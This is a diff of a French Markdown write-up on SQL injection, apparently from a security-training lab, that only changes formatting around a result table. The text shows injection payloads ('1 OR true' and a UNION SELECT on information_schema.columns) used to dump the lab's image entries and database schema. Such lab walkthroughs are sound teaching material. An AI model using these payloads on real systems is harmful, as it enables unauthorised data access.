@@ -7,7 +7,7 @@ L'injection SQL est une méthodes d'exploitation de faille de sécurité d'une a
 En tapant la commande SQL : `1 OR true`
 
 Nous pouvons voir toutes les **listes_images** créé :
-```
+
 | Title            | URL                                             |
 |------------------|-------------------------------------------------|
 | Nsa              | https://fr.wikipedia.org/wiki/Programme_        |
@@ -15,7 +15,7 @@ Nous pouvons voir toutes les **listes_images** créé :
 | Google           | https://fr.wikipedia.org/wiki/Logo_de_Go        |
 | Earth            | https://en.wikipedia.org/wiki/Earth#/med        |
 | Hack me ?        | borntosec.ddns.net/images.png                   |
-```
+
 
 Nous allons faire la commande SQL suivantes pour afficher toutes les tables et colonnes associé :`1 UNION SELECT table_name, column_name FROM information_schema.columns`
 
